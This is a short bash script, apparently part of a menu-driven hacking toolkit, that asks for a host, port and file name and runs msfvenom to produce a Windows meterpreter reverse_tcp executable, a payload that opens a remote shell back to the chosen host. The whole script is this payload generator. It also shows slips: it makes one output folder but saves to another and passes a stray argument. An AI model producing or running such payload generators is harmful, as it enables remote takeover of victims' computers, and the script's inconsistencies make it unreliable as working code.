#!/bin/bash

#	colors
r='\033[1;31m'
g='\033[1;32m'
y='\033[1;33m'
echo -e "$g                  Create$r Payload$y Windows"
echo -e "$y"
echo -e "$y"
echo -e "					 $r[$g 0 $r]$g BaCk"
read -p "Enter Host ~: " host
if [ $host -eq 0 ];then
python joker.py
exit
fi
clear
read -p "Enter Port ~: " port
clear
read -p "Enter Name ~: " name
echo -e "$g"
mkdir /sdcard/JOKER-EGYPT
clear
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe e >  /sdcard/payload5/$name.exe
clear
echo "   $y   Saved payload /sdcard/JOKER-EGYPT/$g"
read -p "Enter BaCk ..."
python joker.py
